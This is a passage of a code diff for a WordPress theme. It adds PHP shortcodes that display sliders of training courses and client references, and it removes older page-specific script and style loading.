+        'taxo' => false
+    ), $atts );
+
+    // slider 'Top Formations'
+    if ( $a['taxo'] == 'top' ) {
+        $args = array(
+            'posts_per_page' => 8,
+            'post_type'      => 'formation',
+            'post_status'    => 'publish',
+            'meta_key'       => 'position_formation',
+            'orderby'        => 'meta_value_num', 
+            'order'	         => 'ASC',
+            'meta_query'     => array(
+                array(
+                    'key'     => 'top_formation',
+                    'value'   => true,
+                    'compare' => '=',
+                )
+            )
+        );
+        // other sliders
+    }else{
+        $args = array(
+            'post_type'      => 'formation',
+            'post_status'    => 'publish',
+            'posts_per_page' => $a['nb'],
+            'post__not_in'   => array( $post_id ),
+        );
+    }
+    if ( $a['taxo'] == 'formateur' ) {
+        $args['tax_query']    = array(
+            array(
+                'taxonomy' => 'formateur',
+                'terms'    => get_queried_object()->term_id,
+                'field'    => 'term_id'
+            )
+        );
+        $args['post__not_in'] = array();
+    } elseif ( $a['taxo'] == 'thematique' ) {
+        $thematiques       = get_the_terms( $post_id, 'thematique' );
+        $id_terms          = wp_list_pluck( $thematiques, 'term_id' );
+        $args['tax_query'] = array( array( 'taxonomy' => 'thematique', 'terms' => $id_terms, 'field' => 'term_id' ) );
+    } else {
+        $args['meta_query'] = array( array( 'key' => 'top_formation', 'value' => true, 'compare' => '=' ) );
+    }
+
+    $formations = get_posts( $args );
+    if ( $formations ) { 
+        $i=0; ?> 
+<div id="nos-formations">
+    <style>main .slick-list{overflow:hidden !important;}</style>
+    <div id="formations"> 
+        <?php foreach ( $formations as $formation ) { ?>
+        <div class="col-kard">
+            <div class="wrapper">
+                <!-- Image -->  
+                <?php if ( get_field( 'image_header_formation', $formation->ID ) ): ?>
+                <a href="<?php echo get_the_permalink( $formation->ID ); ?>">   
+                    <img src="<?php the_field( 'image_header_formation', $formation->ID ); ?>" alt="">
+                </a>
+                <?php endif; ?>
+                <div>
+                    <a href="<?php echo get_the_permalink( $formation->ID ); ?>">
+                        <h4><?php echo $formation->post_title; ?></h4>
+                    </a>  
+                    <?php if ( get_field( 'tag_nouvelle_formation', $formation->ID ) ): echo "<div class='nouvelle_formation'></div>" ?><?php endif; ?>
+                    <?php if ( get_field( 'tag_top_formation', $formation->ID ) ): echo "<div class='top_formation'></div>" ?><?php endif; ?>
+                    <?php if ( get_field( 'presentation', $formation->ID ) ): ?>
+                    <p><span class="line-clamp line-clamp-sm-3"><?php echo wp_trim_words( get_field( 'presentation', $formation->ID ), 30, '...' ); ?></span> <!-- <a class="course-link" href="{{course.link}}">En savoir plus sur cette formation.</a>--></p><?php endif; ?>
+                </div>
+                <div class="alignCenter">
+                    <!-- Formateur -->                                        
+                    <?php if ( $formateurs = wp_get_post_terms( $formation->ID, 'formateur' ) ): ?>
+                    <?php $j = 0; foreach ( $formateurs as $formateur ): ?>
+                    <?php if($j==0){?>
+                    <img
+                         src="<?php the_field( 'avatar', 'formateur_' . $formateur->term_id ); ?>"
+                         alt="" width="100" height="100">
+                    <span><i>Animée par :</i><br><b><?php echo $formateur->name; ?></b>
+                    </span><?php } $j=+1; ?><?php endforeach; ?><?php endif; ?>
+                </div>
+                <a class="en-savoir-plus" href="<?php echo get_the_permalink( $formation->ID ); ?>">
+                    <div class="btn btn-xs btn-red">En savoir plus</div>
+                </a>
+            </div>
+        </div>
+        <?php } ?>
+    </div>
+</div>
+<?php  }
+
+}
+add_shortcode( 'kz_courses_slider', 'kz_shortcode_coursesSlider' );
+add_shortcode( 'formations_slider', 'kz_shortcode_coursesSlider' );
+
+// -----------------------------------------------------------------------
+// FN: Display Ref Slider
+// -----------------------------------------------------------------------
+
+function kz_shortcode_refSlider( $atts ) {
+
+    wp_enqueue_script( 'slick-refs' );
+    wp_enqueue_style( 'references-style');
+
+    $a = shortcode_atts( array(
+        'type' => false
+    ), $atts );
+    $args = array(
+        'post_type'      => 'reference',
+        'post_status'    => 'publish',
+        'posts_per_page' => - 20,
+    );
+    if ( $a['type'] ) {
+        $args['tax_query'] = array(
+            array(
+                'taxonomy' => 'reference',
+                'terms'    => $a['type'],
+                'field'    => 'slug'
+            )
+        );
+    }
+    $references = new WP_Query( $args );
+    $refs = array();
+    if ( $references->have_posts() ) {
+        $out = '<div class="wrapper">';
+        while ( $references->have_posts() ) {
+            $references->the_post();
+            $ref = [
+                "url" => esc_url( get_field( 'url' ) ),
+                "thumb" => get_the_post_thumbnail( get_the_ID() ),
+            ];
+            array_push($refs, $ref);
         }
-    }
-}
-//Disabling Automatic Scrolling On All Forms
-add_filter( 'gform_confirmation_anchor', '__return_false' );
-//Load sticky js
-wp_enqueue_script( 'sticky-js', get_stylesheet_directory_uri() . '/js/sticky.js', array( 'jquery' ), null, false );
-
-
-// ACF custom search function
-include( 'inc/custom-search-acf-wordpress.php' );
-
-
-
-
-
-
-
-
-/**
- * Chargement des styles et scripts pour la page   'Home'
- */
-
-//Register hook to load scripts
-add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_home');
-//Load scripts (and styles)
-function custom_scripts_and_styles_home(){
-
-    if(is_page()){ //Check if we are viewing a page
-        global $wp_query;
-
-        //Check which template is assigned to current page we are looking at
-        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
-        if($template_name == 'template-home.php'){
-            wp_enqueue_style( 'home-style', get_template_directory_uri() . '/css/home.css', null );
+        foreach ($refs as &$that_ref) {
+            $out .= '<a class="ref" href="' . $that_ref['url'] . '">';
+            $out .= $that_ref['thumb'];
+            $out .= '</a>';
         }
+        $out .= '</div>';
+        return $out;
     }
 }
-
-
-/**
- * Chargement des styles et scripts pour la page   'Nos formations'
- */
-
-//Register hook to load scripts
-add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_courses');
-//Load scripts (and styles)
-function custom_scripts_and_styles_courses(){
-
-    if(is_page()){ //Check if we are viewing a page
-        global $wp_query;
-
-        //Check which template is assigned to current page we are looking at
-        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
-        if($template_name == 'tpl-nos-formations.php'){
-            wp_enqueue_script( 'angular', get_stylesheet_directory_uri() . '/js/angular.min.js', null, null, false );
-            wp_enqueue_script( 'angular-sanitize', get_stylesheet_directory_uri() . '/js/angular-sanitize.min.js', null, null, false );
-            wp_enqueue_script( 'angular-animate', get_stylesheet_directory_uri() . '/js/angular-animate.min.js', null, null, false );
-            
-        wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
-        wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );
-        wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
-        wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'moment' ), null, false );
-        wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );        }
-    }
-}
-
-
-
+add_shortcode( 'kz_ref_slider', 'kz_shortcode_refSlider' );
+add_shortcode( 'references_slider', 'kz_shortcode_refSlider' );
